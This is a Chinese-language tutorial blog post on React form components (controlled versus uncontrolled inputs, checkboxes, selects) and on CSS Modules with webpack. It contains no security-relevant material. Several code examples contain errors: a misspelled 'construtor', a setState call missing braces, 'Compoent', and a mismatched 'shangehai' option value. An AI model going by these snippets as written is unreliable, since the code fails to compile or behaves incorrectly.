<p>在React合成事件系统中，不存在兼容性问题，可以得到一个合成事件对象。</p>
<h1 id="表单"><a href="#表单" class="headerlink" title="表单"></a>表单</h1><p>在React中，一切数据都是状态，当然也包括表单数据。接下来我们讲讲React是如何处理表单的。</p>
<h2 id="应用表单组件"><a href="#应用表单组件" class="headerlink" title="应用表单组件"></a>应用表单组件</h2><p>html表单中的所有组件在React的JSX都有实现，只是它们在用法上有些区别，有些是JSX语法上的，有些则是由于React对状态处理上导致的一些区别。</p>
<p>1.文本框<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> React, &#123; Component &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>(props) &#123;</span><br><span class="line">    <span class="keyword">super</span>(props);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.state = &#123;</span><br><span class="line">      inputValue: <span class="string">''</span>,</span><br><span class="line">      textareaValue: <span class="string">''</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  handleInputChange = <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">this</span>.setState(&#123;</span><br><span class="line">      inputValue: e.target.value</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  handleTextareaChange = <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">this</span>.setState(&#123;</span><br><span class="line">      textareaValue: e.target.value</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; inputValue, textareaValue &#125; = <span class="keyword">this</span>.state;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">        &lt;p&gt;</span><br><span class="line">          单行输入框：</span><br><span class="line">          &lt;input type=<span class="string">"text"</span> value=&#123;inputValue&#125; onChange=&#123;<span class="keyword">this</span>.handleInputChange&#125;/&gt;</span><br><span class="line">        &lt;<span class="regexp">/p&gt;</span></span><br><span class="line"><span class="regexp">        &lt;p&gt;</span></span><br><span class="line"><span class="regexp">          多行输入框：</span></span><br><span class="line"><span class="regexp">          &lt;textarea type="text" value=&#123;textareaValue&#125; onChange=&#123;this.handleTextareaChange&#125;/</span>&gt;</span><br><span class="line">        &lt;<span class="regexp">/p&gt;</span></span><br><span class="line"><span class="regexp">      &lt;/</span>div&gt;</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>在HTML中textarea的值是通过children来表示的，而在react中是用一个value prop来表示表单的值的。</p>
<p>2.单选按钮与复选框</p>
<p>在HTML中，用类型为radio的input标签表示单选按钮，用类型为checkbox的input标签表示复选框。这两种表单的value值一般是不会改变的，而是通过一个布尔类型的checked prop来表示是否为选中状态。在JSX中这些是相同的，不过用法上还是有些区别。</p>
<p>单选按钮的示例<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> React, &#123; Component &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  construtor(props) &#123;</span><br><span class="line">    <span class="keyword">super</span>(props);</span><br><span class="line">    <span class="keyword">this</span>.state = &#123;</span><br><span class="line">      radioValue: <span class="string">''</span>,</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  handleChange = <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">this</span>.setState(</span><br><span class="line">      radioValue: e.target.value</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; radioValue &#125; = <span class="keyword">this</span>.state;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">        &lt;p&gt;gender:&lt;<span class="regexp">/p&gt;</span></span><br><span class="line"><span class="regexp">        &lt;label&gt;</span></span><br><span class="line"><span class="regexp">          male:</span></span><br><span class="line"><span class="regexp">          &lt;input </span></span><br><span class="line"><span class="regexp">            type="radio"</span></span><br><span class="line"><span class="regexp">            value="male"</span></span><br><span class="line"><span class="regexp">            checked=&#123;radioValue === 'male'&#125;</span></span><br><span class="line"><span class="regexp">            onChange=&#123;this.handleChange&#125;</span></span><br><span class="line"><span class="regexp">          /</span>&gt;</span><br><span class="line">        &lt;<span class="regexp">/label&gt;</span></span><br><span class="line"><span class="regexp">        &lt;label&gt;</span></span><br><span class="line"><span class="regexp">          female:</span></span><br><span class="line"><span class="regexp">          &lt;input </span></span><br><span class="line"><span class="regexp">            type="radio"</span></span><br><span class="line"><span class="regexp">            value="female"</span></span><br><span class="line"><span class="regexp">            checked=&#123;radioValue === 'female'&#125;</span></span><br><span class="line"><span class="regexp">            onChange=&#123;this.handleChange&#125;</span></span><br><span class="line"><span class="regexp">          /</span>&gt;</span><br><span class="line">        &lt;<span class="regexp">/label&gt;</span></span><br><span class="line"><span class="regexp">      &lt;/</span>div&gt;</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>复选按钮的示例<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> React, &#123; Component &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>(props) &#123;</span><br><span class="line">    <span class="keyword">super</span>(props)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">this</span>.state = &#123;</span><br><span class="line">      coffee: []</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  handleChange = <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; checked, value &#125; = e.target;</span><br><span class="line">    <span class="keyword">let</span> &#123; coffee &#125; = <span class="keyword">this</span>.state;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (checked &amp;&amp; coffee.indexOf(value) === <span class="number">-1</span>) &#123;</span><br><span class="line">      coffee.push(value)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      coffee = coffee.filter(<span class="function"><span class="params">i</span> =&gt;</span> i !== value)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.setState(&#123;</span><br><span class="line">      coffee,</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; coffee &#125; = <span class="keyword">this</span>.state;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">        &lt;p&gt;请选择你最喜欢的咖啡&lt;<span class="regexp">/p&gt;</span></span><br><span class="line"><span class="regexp">        &lt;label&gt;</span></span><br><span class="line"><span class="regexp">          &lt;input </span></span><br><span class="line"><span class="regexp">            type="checkbox"</span></span><br><span class="line"><span class="regexp">            value="Cappuccino"</span></span><br><span class="line"><span class="regexp">            checked=&#123;coffee.indexOf('Cappuccino') !== -1&#125;</span></span><br><span class="line"><span class="regexp">            onChange=&#123;this.handleChange&#125;</span></span><br><span class="line"><span class="regexp">          /</span>&gt;</span><br><span class="line">          Cappuccino</span><br><span class="line">        &lt;<span class="regexp">/label&gt;</span></span><br><span class="line"><span class="regexp">        &lt;br /</span>&gt;</span><br><span class="line">        &lt;label&gt;</span><br><span class="line">          &lt;input </span><br><span class="line">            type=<span class="string">"checkbox"</span></span><br><span class="line">            value=<span class="string">"CafeMocha"</span></span><br><span class="line">            checked=&#123;coffee.indexOf(<span class="string">'CafeMocha'</span>) !== <span class="number">-1</span>&#125;</span><br><span class="line">            onChange=&#123;<span class="keyword">this</span>.handleChange&#125;</span><br><span class="line">          /&gt;</span><br><span class="line">          CafeMocha</span><br><span class="line">        &lt;<span class="regexp">/label&gt;</span></span><br><span class="line"><span class="regexp">      &lt;/</span>div&gt;</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>3.Select组件</p>
<p>在HTML的select元素中，存在单选和多选两种。在JSX语法中，同样可以通过设置select标签的multiple={true}来实现一个多选下拉列表。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>(props) &#123;</span><br><span class="line">    <span class="keyword">super</span>(props)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.state = &#123;</span><br><span class="line">      area: <span class="string">''</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  handleChange = <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">this</span>.setState(&#123;</span><br><span class="line">      area: e.target.value</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; area &#125; = <span class="keyword">this</span>.state;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;select value=&#123;area&#125; onChange=&#123;<span class="keyword">this</span>.handleChange&#125;&gt;</span><br><span class="line">        &lt;option value=<span class="string">'beijing'</span>&gt;北京&lt;<span class="regexp">/option&gt;</span></span><br><span class="line"><span class="regexp">        &lt;option value='shangehai'&gt;上海&lt;/</span>option&gt;</span><br><span class="line">      &lt;<span class="regexp">/select&gt;</span></span><br><span class="line"><span class="regexp">    )</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure></p>
<p>select元素设置multiple={true}的示例<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>(props) &#123;</span><br><span class="line">    <span class="keyword">super</span>(props)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.state = &#123;</span><br><span class="line">      area: [<span class="string">'beijing'</span>, <span class="string">'shanghai'</span>]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  handleChange = <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; options &#125; = e.target;</span><br><span class="line">    <span class="keyword">const</span> area = <span class="built_in">Object</span>.keys(options)</span><br><span class="line">      .filter(<span class="function"><span class="params">i</span> =&gt;</span> options[i].selected === <span class="literal">true</span>)</span><br><span class="line">      .map(<span class="function"><span class="params">i</span> =&gt;</span> options[i].value);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.setState(&#123;</span><br><span class="line">      area,</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  render () &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; area &#125; = <span class="keyword">this</span>.state;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;select multiple=&#123;<span class="literal">true</span>&#125; value=&#123;area&#125; onChange=&#123;<span class="keyword">this</span>.handleChange&#125;&gt;</span><br><span class="line">        &lt;option value=<span class="string">"北京"</span>&gt;北京&lt;<span class="regexp">/option&gt;</span></span><br><span class="line"><span class="regexp">        &lt;option value="上海"&gt;上海&lt;/</span>option&gt;</span><br><span class="line">      &lt;<span class="regexp">/select&gt;</span></span><br><span class="line"><span class="regexp">    )</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure></p>
<p>在HTMl的option组件需要一个selected属性来表示默认选中的列表项，而React的处理方式是通过为select组件添加value prop来表示选中的option，在一定程度上统一了接口。</p>
<p>实际上，也可以写成这种形式，不过开发体验就会差很多，React也会抛警告。<br><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">&lt;select multiple=&#123;<span class="literal">true</span>&#125; onChange=&#123;<span class="keyword">this</span>.handleChange&#125;&gt;</span><br><span class="line">  &lt;option value=<span class="string">"beijing"</span> selected=&#123;area.indexOf(<span class="string">'beijing'</span>) !== <span class="number">-1</span>&#125;&gt;北京&lt;<span class="regexp">/option&gt;</span></span><br><span class="line"><span class="regexp">  &lt;option value="shanghai" selected=&#123;area.indexOf('shanghai') !== -1&#125;&gt;上海&lt;/</span>option&gt;</span><br><span class="line">&lt;<span class="regexp">/select&gt;</span></span><br></pre></td></tr></table></figure></p>
<h2 id="受控组件"><a href="#受控组件" class="headerlink" title="受控组件"></a>受控组件</h2><p>每当表单的状态发生变化，都会被写入到组件的state中，这种组件在React中被称为受控组件。在受控组件中，组件渲染出的状态与它的value或checked prop相对应。React通过这种方式消除了组件的局部状态，使得应用的整个状态更加可控。</p>
<h2 id="非受控组件"><a href="#非受控组件" class="headerlink" title="非受控组件"></a>非受控组件</h2><p>如果一个表单组件没有value prop(或checked prop),就可以称之为非受控组件。相应的你可以使用defaultValue和defaultChecked prop来表示组件的默认状态。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">Compoent</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>(props) &#123;</span><br><span class="line">    <span class="keyword">super</span>(props)</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  handleSubmit = <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">    e.preventDefault();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> &#123; value &#125; = <span class="keyword">this</span>.refs.name;</span><br><span class="line">    <span class="built_in">console</span>.log(value)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;form onSubmit=&#123;<span class="keyword">this</span>.handleSubmit&#125;&gt;</span><br><span class="line">        &lt;input ref=<span class="string">"name"</span> type=<span class="string">"text"</span> defaultValue=<span class="string">"Hangzhou"</span> /&gt;</span><br><span class="line">        &lt;button type=<span class="string">"submit"</span>&gt;submit&lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp">      &lt;/</span>form&gt;</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>在React中，非受控组件是一种反模式，它的值不受组件自身的state或props控制。通常，需要为其添加ref prop来访问渲染后的底层DOM元素。</p>
<h2 id="对比受控组件和非受控组件"><a href="#对比受控组件和非受控组件" class="headerlink" title="对比受控组件和非受控组件"></a>对比受控组件和非受控组件</h2><p>受控组件和非受控组件的最大区别是：非受控组件的状态并不会受应用状态的控制，应用中也多了局部组件状态，而受控组件的值来自于组件的state。</p>
<p>1.性能上的问题</p>
<p>受控组件onChange后，调用setState会重新渲染，确实会有一些性能损耗。</p>
<p>2.是否需要事件绑定</p>
<p>受控组件需要为每个组件绑定一个change事件，并且定义一个事件处理器来同步表单值和组件的状态。</p>
<p>尽管如此，在React仍然提倡使用受控组件，因为它可以使得应用的整个状态更加可控。</p>
<h2 id="表单组件的几个重要属性"><a href="#表单组件的几个重要属性" class="headerlink" title="表单组件的几个重要属性"></a>表单组件的几个重要属性</h2><p>1.状态属性</p>
<p>React的form组件提供了几个重要的属性，用于展示组件的状态。<br>value: 类型为text的input组件、textarea组件以及select组件都借助value prop来展示应用的状态。<br>checked: 类型为radio或checkbox的组件借助值为boolean类型的checked prop来展示应用的状态。<br>selected: 该属性可作用于select组件下面的option上，React并不建议使用功这种方式，推荐使用value.</p>
<p>2.事件属性</p>
<p>在状态属性发生变化时，会触发onChange事件属性。实际上，受控组件中的change事件与HTML DOM中提供的input事件更为类似。React支持DOM Level3中定义的所有表单事件。</p>
<h1 id="样式处理"><a href="#样式处理" class="headerlink" title="样式处理"></a>样式处理</h1><h2 id="基本样式设置"><a href="#基本样式设置" class="headerlink" title="基本样式设置"></a>基本样式设置</h2><p>React可以通过设置className prop给html设置class，也可以通过style prop给组件设置行内样式。</p>
<h2 id="使用classnames库"><a href="#使用classnames库" class="headerlink" title="使用classnames库"></a>使用classnames库</h2><p>我们可以通过classnames库来设置html的类名</p>
<h2 id="CSS-Modules"><a href="#CSS-Modules" class="headerlink" title="CSS Modules"></a>CSS Modules</h2><p>CSS模块化的解决方案有很多，但主要有两类。</p>
<ol>
<li>Inline Style。这种方案彻底抛弃CSS，使用JavaScript或JSON来写样式，能给CSS提供JavaScript同样强大的模块化能力。但缺点同样明显，它几乎不能利用CSS本身的特性，比如级联、媒体查询等，:hover和:active等伪类处理起来比较复杂。另外，这种方案需要依赖框架实现，其中与React相关的有Radium、jsxstyle和react-style</li>
<li>CSS Modules。依旧使用CSS，但使用JavaScript来管理样式依赖。CSS Modules能最大化地结合现有CSS生态和JavaScript模块化能力，其API非常简洁。发布时依旧编译出单独的JavaScript和CSS文件。现在，webpack css-loader内置CSS Modules功能。</li>
</ol>
<p>1.CSS模块化遇到了哪些问题</p>
<p>CSS模块化重要的是解决好以下两个问题：CSS样式的导入与导出。灵活按需导入以便复用代码，导出时要隐藏内部作用域，以免造成全局污染。Sass、Less、PostCSS等试图解决CSS编程能力弱的问题，但并没有解决模块化这个问题。React实际开发需要的CSS相关问题有：</p>
<ol>
<li>全局污染：CSS使用全局选择器机制来设置样式，优点是方便重写样式。缺点是所有的样式全局生效，样式可能被错误覆盖。因此产生了非常丑陋的!important，甚至inline !important和复杂的选择器权重计数表，提高犯错概率和使用成本。Web Component标准中的Shadow DOM能彻底解决这个问题，但它把样式彻底局部化，造成外部无法重写样式，损失了灵活性。</li>
<li>命名混乱：由于全局污染的问题，多人协同开发时为了避免样式冲突，选择器越来越复杂，容易形成不同的命名风格，样式变多后，命名将更加混乱。</li>
<li>依赖管理不彻底：组件应该相互独立，引入一个组件时，应该只引入它所需要的CSS样式。现在的做法是除了引入JavaScript，还要再引入它的CSS，而且Sass/Less很难实现对每个组件都编译出单独的CSS，引入所有模块的CSS又造成浪费。JavaScript的模块化已经非常成熟，如果能让JavaScript来管理CSS依赖是很好的解决办法，而webpack的css-loader提供了这种能力。</li>
<li>无法共享变量：复杂组件要使用JavaScript和CSS来共同处理样式，就会造成有些变量在JavaScript和CSS中冗余，而预编译语言不能提供跨JavaScript和CSS共享变量的这种能力。</li>
<li>代码压缩不彻底：对与非常长的类名压缩无能为力。</li>
</ol>
<p>2.CSS Modules模块化方案</p>
<p>CSS Modules内部通过ICSS来解决样式导入和导出这两个问题，分别对应:import和:export两个新增的伪类。<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">:import("path/to/dep.css") &#123;</span><br><span class="line">  <span class="selector-tag">localAlias</span>: <span class="selector-tag">keyFromDep</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-pseudo">:export</span> &#123;</span><br><span class="line">  <span class="attribute">exportedKey</span>: exportedValue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>但直接使用这两个关键字编程太烦琐，项目中很少会直接使用它们，我们需要的是用JavaScript来管理CSS的能力。结合webpack的css-loader，就可以在CSS中定义样式，在JavaScript文件中导出。</p>
<h2 id="启用CSS-Modules"><a href="#启用CSS-Modules" class="headerlink" title="启用CSS Modules"></a>启用CSS Modules</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">css?modules&amp;localIdentName=[name]__[local]-[hash:base64:<span class="number">5</span>]</span><br></pre></td></tr></table></figure>
<p>加上modules即为启用，其中localIdentName是设置生成样式命名规则</p>
<p>下面我们看看js是怎么引入CSS的：<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* button相关的所有样式 */</span></span><br><span class="line"><span class="selector-class">.normal</span> &#123;&#125;</span><br></pre></td></tr></table></figure></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> styles <span class="keyword">from</span> <span class="string">'./Button.css'</span></span><br><span class="line"></span><br><span class="line">buttonElm.outerHTML = <span class="string">`&lt;button class=<span class="subst">$&#123;styles.normal&#125;</span>&gt;Submit&lt;/button&gt;`</span></span><br></pre></td></tr></table></figure>
<p>最终生成的HTML是这样的<br><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">&lt;button <span class="class"><span class="keyword">class</span></span>=<span class="string">"button--normal-abc5436"</span>&gt;Processing...&lt;<span class="regexp">/button&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>这样class的名称基本就是唯一的。<br>CSS Modules对CSS中的class名都做了处理，使用对象来保存原class和混淆后class的对应关系。通过这些简单的处理，CSS Modules实现了以下几点：</p>
<ol>
<li>所有样式都是局部化的，解决了命名冲突和全局污染问题</li>
<li>class名生成规则配置灵活，可以以此来压缩class名</li>
<li>只需要引用组件的JavaScript，就能搞定组件所有的JavaScript和CSS</li>
<li>依然是CSS，学习成本几乎为零<h2 id="样式默认局部"><a href="#样式默认局部" class="headerlink" title="样式默认局部"></a>样式默认局部</h2>使用CSS Modules相当于给每个class名外加了:local，以此来实现样式的局部化。如果我们想切换到全局模式，可以使用:global包裹<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">.normal &#123;</span><br><span class="line">  color: green;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 与上面等价 */</span></span><br><span class="line">:local(.normal) &#123;</span><br><span class="line">  color: green;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 定义全局样式 */</span></span><br><span class="line">:global(.btn) &#123;</span><br><span class="line">  color: red;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 定义多个全局样式 */</span></span><br><span class="line">:global &#123;</span><br><span class="line">  .link &#123;</span><br><span class="line">    color: green;</span><br><span class="line">  &#125;</span><br><span class="line">  .box &#123;</span><br><span class="line">    color: yellow;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="使用composes来组合样式"><a href="#使用composes来组合样式" class="headerlink" title="使用composes来组合样式"></a>使用composes来组合样式</h2><p>对于样式复用，CSS Modules只提供了唯一的方式来处理——composes组合。<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* components/Button.css */</span></span><br><span class="line"><span class="selector-class">.base</span> &#123; <span class="comment">/* 所有通用的样式 */</span> &#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.normal</span> &#123;</span><br><span class="line">  <span class="attribute">composes</span>: base;</span><br><span class="line">  <span class="comment">/* normal其他样式 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>此外，使用composes还可以组合外部文件中的样式<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* settings.css */</span></span><br><span class="line"><span class="selector-class">.primary-color</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#f40</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* component/Button.css */</span></span><br><span class="line"><span class="selector-class">.base</span> &#123; <span class="comment">/* 所有通用样式 */</span> &#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.primary</span> &#123;</span><br><span class="line">  <span class="attribute">composes</span>: base;</span><br><span class="line">  <span class="attribute">composes</span>: $primary-color from <span class="string">'./settings.css'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>对于大多数项目，有了composes后，已经不再需要预编译处理器了。但是如果想用的话，由于composes不是标准的CSS语法，编译会报错，此时只能使用预处理自己的语法做样式复用了。</p>
<h2 id="class命名技巧"><a href="#class命名技巧" class="headerlink" title="class命名技巧"></a>class命名技巧</h2><p>CSS Modules的命名规范是从BEM扩展而来的。BEM把样式名分为3个级别</p>
<ol>
<li>Block: 对应模块名，如Dialog</li>
<li>Element: 对应模块中的节点名 Confirm Button</li>
<li>Modifier: 对应节点相关的状态，如disabled和highlight<br>如dialog__confirm-button–highlight。<h2 id="实现CSS与JavaScript变量共享"><a href="#实现CSS与JavaScript变量共享" class="headerlink" title="实现CSS与JavaScript变量共享"></a>实现CSS与JavaScript变量共享</h2>:export关键字可以把CSS中的变量输出到JavaScript中<figure class="highlight scss"><table><tr><td class="code"><pre><span class="line"><span class="variable">$primary-color</span>: <span class="number">#f40</span>;</span><br><span class="line"></span><br><span class="line">:export &#123;</span><br><span class="line">  primaryColor: <span class="variable">$primary-color</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// app.js</span></span><br><span class="line"><span class="keyword">import</span> style <span class="keyword">from</span> <span class="string">'config.scss'</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(style.primaryColor);</span><br></pre></td></tr></table></figure>
<h2 id="CSS-Modules使用技巧"><a href="#CSS-Modules使用技巧" class="headerlink" title="CSS Modules使用技巧"></a>CSS Modules使用技巧</h2><p>建议遵循如下原则</p>
<ol>
<li>不使用选择器，只使用class名来定义样式</li>
<li>不层叠多个class，只使用一个class把所有样式定义好</li>
<li>所有样式通过composes组合来实现复用</li>
<li>不嵌套<br>常见问题<br>1.如果在一个style文件使用同名class?<br>虽然编译后可能是随机码，但仍是同名的。<br>2.如果在style文件中使用了id选择器、伪类和标签选择器等呢？<br>这些选择器不被转换，原封不动地出现在编译后的CSS中。也就是CSS Moudles只会转换class名相关的样式<h2 id="CSS-Modules结合历史遗留项目实践"><a href="#CSS-Modules结合历史遗留项目实践" class="headerlink" title="CSS Modules结合历史遗留项目实践"></a>CSS Modules结合历史遗留项目实践</h2></li>
</ol>
<p>1.外部如何覆盖局部样式</p>
<p>因为无法预知最终的class名，不能通过一般选择器覆盖样式。我们可以给组件关键节点加上data-role属性，然后通过属性选择器来覆盖样式。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// dialog.js</span></span><br><span class="line"><span class="keyword">return</span> (</span><br><span class="line">  &lt;div className=&#123;styles.root&#125; data-role=<span class="string">"dialog-root"</span>&gt;&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">);</span></span><br></pre></td></tr></table></figure></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">// dialog.css</span><br><span class="line"><span class="selector-attr">[data-role=<span class="string">"dialog-root"</span>]</span> &#123;</span><br><span class="line">  // override style</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>2.如何与全局样式共存</p>
<p>修改webpack配置<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">module</span>: &#123;</span><br><span class="line">  loaders: [&#123;</span><br><span class="line">    test: <span class="regexp">/\.scss$/</span>,</span><br><span class="line">    exclude: path.resolve(__dirname, <span class="string">'src/views'</span>),</span><br><span class="line">    loader: <span class="string">'style!css?modules&amp;localIdentName=[name]__[local]!sass?sourceMap=true'</span>,</span><br><span class="line">  &#125;, &#123;</span><br><span class="line">    test: <span class="regexp">/\.scss$/</span>,</span><br><span class="line">    include: path.resolve(__dirname, <span class="string">'src/styles'</span>),</span><br><span class="line">    loader: <span class="string">'style!css!sass?sourceMap=true'</span></span><br><span class="line">  &#125;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* src/app.js */</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">'./styles/app.scss'</span>;</span><br><span class="line"><span class="keyword">import</span> Component <span class="keyword">from</span> <span class="string">'./view/Component'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* src/views/Component.js */</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">'./Component.scss'</span></span><br></pre></td></tr></table></figure>
<h2 id="CSS-Modules结合React实践"><a href="#CSS-Modules结合React实践" class="headerlink" title="CSS Modules结合React实践"></a>CSS Modules结合React实践</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> styles <span class="keyword">from</span> <span class="string">'./dialog.css'</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dialog</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;div className=&#123;styles.root&#125;&gt;&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">    )</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure>
<p>如果不想频繁地输入styles.**，可以使用react-css-modules</p>
